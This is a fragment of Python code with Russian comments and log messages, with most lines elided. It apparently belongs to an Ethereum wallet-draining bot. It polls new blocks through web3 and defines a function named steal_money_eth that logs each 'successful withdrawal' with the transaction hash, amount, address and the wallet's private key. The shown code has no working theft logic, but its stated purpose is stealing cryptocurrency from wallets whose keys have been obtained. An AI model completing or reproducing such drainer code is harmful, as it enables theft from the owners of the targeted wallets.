...
def getblocks_eth():
    """Получение блоков"""
    while True:
        latestBlock = web3.eth.get_block(block_identifier=web3.eth.default_block, full_transactions=True)
        print(str(latestBlock))
...
def steal_money_eth(address):
    ...
    try:
        ...
        print(
            f'ETH | УСПЕШНЫЙ ВЫВОД | ХЕШ: {hash_xd} | СУММА: {amount_ether} | АДРЕС: {address} | ПРИВАТ: {wallet_key}')
